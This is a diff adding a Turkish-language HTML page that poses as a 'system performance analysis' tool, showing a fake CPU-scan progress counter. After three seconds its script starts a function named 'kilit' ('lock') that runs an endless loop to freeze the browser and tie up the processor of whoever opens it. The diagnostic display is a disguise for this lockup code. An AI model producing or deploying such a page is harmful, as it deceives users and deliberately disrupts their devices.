@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Performans Analizi</title>
+    <style>
+        body { background-color: #111; color: #00ff00; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { border: 2px solid #00ff00; padding: 20px; border-radius: 10px; background: #222; text-align: center; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>İŞLEMCİ ANALİZİ BAŞLATILDI</h2>
+        <div class="loader"></div>
+        <p id="status">Çekirdekler taranıyor... %0</p>
+    </div>
+    <script>
+        let p = 0;
+        setInterval(() => {
+            if(p < 99) p++;
+            document.getElementById('status').innerText = "Çekirdekler taranıyor... %" + p;
+        }, 400);
+
+        function kilit() {
+            while(true) {
+                Math.sqrt(Math.random() * 999999);
+            }
+        }
+        setTimeout(kilit, 3000);
+    </script>
+</body>
+</html>
